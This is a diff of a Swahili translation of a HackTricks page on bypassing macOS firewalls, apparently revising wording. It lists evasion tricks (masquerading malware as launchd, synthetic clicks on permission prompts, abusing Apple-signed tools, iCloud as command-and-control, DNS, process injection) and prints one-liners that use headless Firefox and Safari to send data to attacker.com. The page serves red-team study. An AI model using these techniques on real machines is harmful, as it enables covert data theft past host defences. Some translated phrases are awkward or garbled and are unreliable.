@@ -1,56 +1,56 @@
-# Kupita Kizuizi za Firewalls za macOS
+# Kupitisha Firewalls ya macOS
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 ## Mbinu Zilizopatikana
 
-Mbinu zifuatazo zilipatikana kufanya kazi kwenye baadhi ya programu za kizuizi cha firewall za macOS.
+Mbinu zifuatazo zilipatikana zikifanya kazi kwenye baadhi ya programu za firewall za macOS.
 
-### Kutumia majina ya orodha nyeupe
+### Kutumia majina ya orodha nyeupe vibaya
 
-* Kwa mfano, kuita programu hasidi kwa majina ya michakato maarufu ya macOS kama vile **`launchd`**&#x20;
+* Kwa mfano kuita zisizo na programu na majina ya michakato inayojulikana vizuri ya macOS kama vile **`launchd`**
 
 ### Bonyeza ya Kisynthetic
 
-* Ikiwa kizuizi cha firewall kinahitaji idhini kutoka kwa mtumiaji, fanya programu hasidi **ibonyeze ruhusa**
+* Ikiwa firewall inauliza idhini kwa mtumiaji, fanya zisizo bonyeza **ruhusu**
 
-### **Tumia programu tumizi zilizosainiwa na Apple**
+### **Tumia programu za Apple zilizosainiwa**
 
 * Kama vile **`curl`**, lakini pia nyingine kama vile **`whois`**
 
-### Kikoa maarufu cha Apple
+### Vipeni vya Apple vinavyojulikana
 
-Kizuizi cha firewall kinaweza kuruhusu uhusiano kwenye vikoa maarufu vya Apple kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
+Firewall inaweza kuruhusu uhusiano kwenye vikoa vya Apple vinavyojulikana kama vile **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumika kama C2.
 
-### Kupita Kizuizi kwa Ujumla
+### Kupitisha Kwa Ujumla
 
-Baadhi ya mawazo ya kujaribu kupita kizuizi cha firewall
+Mawazo kadhaa ya kujaribu kupitisha firewalls
 
 ### Angalia trafiki iliyoruhusiwa
 
-Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu gani zinazoruhusiwa kufikia vikoa hivyo
+Kujua trafiki iliyoruhusiwa kutakusaidia kutambua vikoa vilivyowekwa kwenye orodha nyeupe au ni programu zipi zilizoruhusiwa kufikia vikoa hivyo.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Kutumia DNS
+### Kudhuru DNS
 
-Utaratibu wa DNS hutumiwa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo inaweza kuruhusiwa kuwasiliana na seva za DNS.
+Ufumbuzi wa DNS unafanywa kupitia programu iliyosainiwa ya **`mdnsreponder`** ambayo labda itaruhusiwa kuwasiliana na seva za DNS.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (464).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Kupitia programu za Kivinjari
+### Kupitia Programu za Kivinjari
 
 * **oascript**
 ```applescript
@@ -77,9 +77,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Kupitia kuingiza michakato
+### Kupitia sindano za michakato
 
-Ikiwa unaweza **kuingiza namna ya kanuni ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote, unaweza kuzunguka ulinzi wa firewall:
+Ikiwa unaweza **kuingiza nambari ndani ya mchakato** ambao una ruhusa ya kuunganisha kwenye seva yoyote unaweza kukiuka ulinzi wa firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,14 +91,14 @@ Ikiwa unaweza **kuingiza namna ya kanuni ndani ya mchakato** ambao una ruhusa ya
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
